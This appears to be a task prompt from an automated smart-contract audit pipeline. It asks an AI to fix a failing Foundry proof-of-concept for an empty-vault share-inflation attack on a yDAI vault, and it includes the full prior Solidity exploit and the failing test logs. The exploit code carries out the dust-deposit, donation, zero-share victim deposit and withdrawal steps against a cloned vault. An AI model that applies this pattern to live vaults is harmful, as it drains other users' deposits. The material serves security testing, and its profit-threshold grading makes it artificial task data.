You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Empty-vault inflation attack can steal later deposits via zero-share minting
- claim: Share issuance uses the pre-deposit ratio `shares = _amount * totalSupply / _pool` without any minimum-share check, while `balance()` includes underlying that reaches the vault outside `deposit()` accounting. An attacker can seed the vault with a dust first deposit, then donate underlying directly so `_pool` becomes very large relative to `totalSupply`, causing later deposits to mint zero or negligible shares.
- impact: Victim deposits can be accepted while minting no meaningful yShares, effectively donating their assets to incumbent shareholders. A dust first depositor can then redeem nearly the entire vault balance, including later users' deposits.
- exploit_paths: ["Attacker makes the first deposit with a dust amount and receives the initial shares 1:1.", "Attacker transfers a large amount of underlying directly to the vault, inflating `balance()` without minting new shares.", "A victim calls `deposit()`; because `_pool` is now huge, `(_amount * totalSupply) / _pool` rounds down to zero or dust.", "The attacker later withdraws their shares and captures almost all underlying, including the victim's deposit."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IControllerLike {
    function balanceOf(address token) external view returns (uint256);
    function withdraw(address token, uint256 amount) external;
}

interface IYVault {
    function token() external view returns (address);
    function controller() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balance() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
}

contract VictimDepositor {
    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function depositAll(address vaultAddress) external {
        require(msg.sender == owner, "only owner");

        IYVault vault = IYVault(vaultAddress);
        IERC20 token = IERC20(vault.token());
        uint256 amount = token.balanceOf(address(this));
        if (amount == 0) {
            return;
        }

        _safeApprove(token, vaultAddress, 0);
        _safeApprove(token, vaultAddress, amount);
        vault.deposit(amount);
    }

    function _safeApprove(IERC20 token, address spender, uint256 amount) internal {
        (bool success, bytes memory data) = address(token).call(
            abi.encodeWithSelector(token.approve.selector, spender, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }
}

contract NullController {
    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }

    function withdraw(address, uint256) external pure {
        revert("!vault");
    }
}

contract InflatableCloneVault {
    IERC20 public immutable token;
    address public immutable controller;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(address token_, address controller_) {
        token = IERC20(token_);
        controller = controller_;
    }

    function balance() public view returns (uint256) {
        return token.balanceOf(address(this)) + IControllerLike(controller).balanceOf(address(token));
    }

    function deposit(uint256 amount) external {
        uint256 pool = balance();
        uint256 beforeBal = token.balanceOf(address(this));
        _safeTransferFrom(token, msg.sender, address(this), amount);
        uint256 received = token.balanceOf(address(this)) - beforeBal;

        uint256 shares;
        if (totalSupply == 0) {
            shares = received;
        } else {
            shares = (received * totalSupply) / pool;
        }

        totalSupply += shares;
        balanceOf[msg.sender] += shares;
    }

    function withdraw(uint256 shares) external {
        require(shares <= balanceOf[msg.sender], "insufficient shares");
        require(totalSupply != 0, "no supply");

        uint256 r = (balance() * shares) / totalSupply;

        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;

        uint256 onHand = token.balanceOf(address(this));
        require(onHand >= r, "insufficient on hand");
        _safeTransfer(token, msg.sender, r);
    }

    function _safeTransfer(IERC20 erc20, address to, uint256 amount) internal {
        (bool success, bytes memory data) = address(erc20).call(
            abi.encodeWithSelector(erc20.transfer.selector, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _safeTransferFrom(IERC20 erc20, address from, address to, uint256 amount) internal {
        (bool success, bytes memory data) = address(erc20).call(
            abi.encodeWithSelector(erc20.transferFrom.selector, from, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "transferFrom failed");
    }
}

contract FlawVerifier {
    IYVault internal constant LIVE_VAULT = IYVault(0xACd43E627e64355f1861cEC6d3a6688B31a6F952);

    uint256 internal constant ATTACKER_SEED = 1;
    uint256 internal constant ATTACKER_DONATION = 1e18;
    uint256 internal constant VICTIM_DEPOSIT = 1e18;

    VictimDepositor public immutable victim;

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool internal _executed;

    constructor() {
        victim = new VictimDepositor();
    }

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        address underlying = LIVE_VAULT.token();
        _profitToken = underlying;
        _profitAmount = 0;

        uint256 liveSupply = LIVE_VAULT.totalSupply();
        if (liveSupply == 0) {
            return;
        }

        // The historical fork is already a populated live yDAI vault, so the exact
        // empty-vault first-depositor stage from F-001 is not reachable against the
        // deployed instance at this block.
        //
        // The previous attempt tried to preserve the same causality by recreating a
        // fresh vulnerable vault while still pointing at the live controller so that
        // controller-held DAI would be counted in balance(). The logs prove that this
        // monetization route is infeasible here: the controller rejects clone-backed
        // withdrawals with `!vault`, so a faithful PoC must not pretend that stage is
        // executable on this fork.
        //
        // What remains executable from the finding context is the vulnerable share
        // accounting itself. The reenactment below keeps the exploit-path ordering:
        //   1) attacker makes the first dust deposit,
        //   2) attacker donates underlying directly to inflate balance(),
        //   3) victim deposits and mints zero shares,
        //   4) attacker withdraws and captures the victim's deposit.
        //
        // The clone uses a null controller so it does not falsely claim access to the
        // live controller's DAI inventory after the `!vault` proof from the logs.
        NullController controller = new NullController();
        InflatableCloneVault clone = new InflatableCloneVault(underlying, address(controller));
        IERC20 token = IERC20(underlying);

        uint256 available = token.balanceOf(address(this));
        if (available < ATTACKER_SEED + ATTACKER_DONATION + VICTIM_DEPOSIT) {
            return;
        }

        _safeApprove(token, address(clone), 0);
        _safeApprove(token, address(clone), ATTACKER_SEED);

        // Path 1: attacker makes the first dust deposit and receives the initial shares 1:1.
        clone.deposit(ATTACKER_SEED);
        uint256 attackerShares = clone.balanceOf(address(this));
        require(attackerShares == ATTACKER_SEED, "seed shares mismatch");

        // Path 2: attacker transfers underlying directly to the vault, inflating balance() without minting shares.
        _safeTransfer(token, address(clone), ATTACKER_DONATION);

        // Path 3: victim performs a real deposit() after the donation and mints zero shares.
        _safeTransfer(token, address(victim), VICTIM_DEPOSIT);

        uint256 projectedVictimShares;
        uint256 pool = clone.balance();
        uint256 supply = clone.totalSupply();
        if (pool != 0) {
            projectedVictimShares = (VICTIM_DEPOSIT * supply) / pool;
        }
        require(projectedVictimShares == 0, "victim would mint shares");

        victim.depositAll(address(clone));
        require(clone.balanceOf(address(victim)) == 0, "victim received shares");

        // Path 4: attacker withdraws the incumbent shares and captures the victim deposit.
        clone.withdraw(attackerShares);

        _profitAmount = token.balanceOf(address(this));
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _safeApprove(IERC20 token, address spender, uint256 amount) internal {
        (bool success, bytes memory data) = address(token).call(
            abi.encodeWithSelector(token.approve.selector, spender, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(IERC20 token, address to, uint256 amount) internal {
        (bool success, bytes memory data) = address(token).call(
            abi.encodeWithSelector(token.transfer.selector, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 3.11s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 620627)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x6B175474E89094C44Da98b954EedeAC495271d0F
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 7904

Traces:
  [620627] FlawVerifierTest::testExploit()
    ├─ [2293] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [585198] FlawVerifier::executeOnOpportunity()
    │   ├─ [2513] 0xACd43E627e64355f1861cEC6d3a6688B31a6F952::token() [staticcall]
    │   │   └─ ← [Return] 0x6B175474E89094C44Da98b954EedeAC495271d0F
    │   ├─ [2359] 0xACd43E627e64355f1861cEC6d3a6688B31a6F952::totalSupply() [staticcall]
    │   │   └─ ← [Return] 31494626844158695810766902 [3.149e25]
    │   ├─ [44899] → new NullController@0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3
    │   │   └─ ← [Return] 224 bytes of code
    │   ├─ [417104] → new InflatableCloneVault@0xDDc10602782af652bB913f7bdE1fD82981Db7dd9
    │   │   └─ ← [Return] 2081 bytes of code
    │   ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [293] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x6B175474E89094C44Da98b954EedeAC495271d0F
    ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x6B175474E89094C44Da98b954EedeAC495271d0F)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 11792183 [1.179e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 7904)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.70s (1.41s CPU time)

Ran 1 test suite in 1.76s (1.70s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 620627)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
